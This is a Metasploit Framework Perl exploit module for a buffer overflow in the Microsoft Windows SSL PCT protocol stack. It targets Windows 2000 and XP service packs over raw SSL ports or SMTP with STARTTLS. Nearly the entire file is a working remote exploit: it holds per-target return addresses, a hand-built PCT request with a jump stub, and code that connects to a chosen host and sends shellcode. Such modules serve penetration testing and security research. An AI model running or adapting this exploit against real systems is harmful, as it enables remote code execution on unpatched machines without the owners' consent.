
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::windows_ssl_pct;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Windows SSL PCT Overflow',
    'Version'  => '$Revision: 1.7 $',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
                   'Johnny Cyberpunk <jcyberpunk@thc.org> [Unknown License]' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 443],
                    'PROTO' => [0, 'DATA', 'The application protocol (raw or smtp)', 'raw'],
                },

    'Payload' => {
                 'MinNops'   => 0,
                 'MaxNops'   => 0, 
                 'Space'     => 1800,
                 'BadChars'  => '',
                 },
    
    'Description'  => qq{
    This module exploits a buffer overflow in the Microsoft Windows SSL PCT
    protocol stack. This code is based on Johnny Cyberpunk's THC release
    and has been tested against Windows 2000 and Windows XP. To use this module,
    specify the remote port of any SSL service, or the port and protocol of
    an application that uses SSL. The only application protocol supported at
    this time is SMTP.
    },

    'Refs'    => [ 'http://www.osvdb.org/5250' ],
    'Targets' => [
                   ['Windows 2000 SP4', 0x67419ce8], # jmp [esp + 0x6c]
                   ['Windows 2000 SP3', 0x67419e1d], # jmp [esp + 0x6c]
                   ['Windows 2000 SP2', 0x6741a426], # jmp [esp + 0x6c]
                   ['Windows 2000 SP1', 0x77e4f44d], # jmp [ebx + 0x14]
                   ['Windows 2000 SP0', 0x7658a6cb], # jmp [ebx + 0x0e]
                   ['Windows XP SP0',   0x0ffb7de9], # jmp [esp + 0x6c]
                   ['Windows XP SP1',   0x0ffb832f], # jmp [esp + 0x6c]
                   ['Debugging Target', 0x01020304], # -----------------
                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my $proto  = $self->GetVar('PROTO');
    my $target = $self->Targets->[$target_idx];

    $self->PrintLine("[*] Attempting to exploit target " . $target->[0]);


    # this is a heap ptr to the ssl request
    # ... and just happens to not die
    # thanks to Core ST, Halvar, JohnnyC :)
    #
    #   80620101     =>  and byte ptr [esi+1], 0x2
    #   bd00010001   =>  mov ebp, 0x1000100
    #   0016         =>  add [esi], dl
    #   8f8201000000 =>  pop [esi+1]
    #   eb0f         =>  jmp short 11 to shellcode
    
    my $request =
        "\x80\x66\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x86\x01\x00\x00\x00".
        "\xeb\x0f".'XXXXXXXXXXX'.pack('V', ($target->[1] ^ 0xffffffff)).
        $shellcode;
           
    my $s = Msf::Socket->new({'SSL' => 0});
    if (! $s->Tcp($target_host, $target_port))
    {
        $self->PrintLine("[*] Error: could not connect: " . $s->GetError());
        return;
    }
    
    my $res;
    
    # Exploit via SMTP and STARTTLS
    if ($proto =~ /smtp/i) {
        $res = $s->Recv(-1, 45);
        $res =~ s/\r|\n//g;
        $self->PrintLine("[*] REMOTE> $res");

        $s->Send("HELO METASPLOIT.COM\r\n");
        $res = $s->Recv(-1, 5);
        $res =~ s/\r|\n//g;
        $self->PrintLine("[*] REMOTE> $res");

        $s->Send("STARTTLS\r\n");
        $res = $s->Recv(-1, 5);
        $res =~ s/\r|\n//g;
        $self->PrintLine("[*] REMOTE> $res");

        if ($res !~ /^220.*SMTP server ready/) {
            $self->PrintLine("[*] Invalid response to STARTTLS");
            return(0);
        }
    }

    $self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
    $s->Send($request);

    $self->PrintLine("[*] Waiting for a response...");
    $res = $s->Recv(-1, 5);
    
    if ($res && $res eq "\x00\x00\x01") {
        $self->PrintLine("[*] Response indicates that PCT is disabled");
    }
    
    return(0);
}
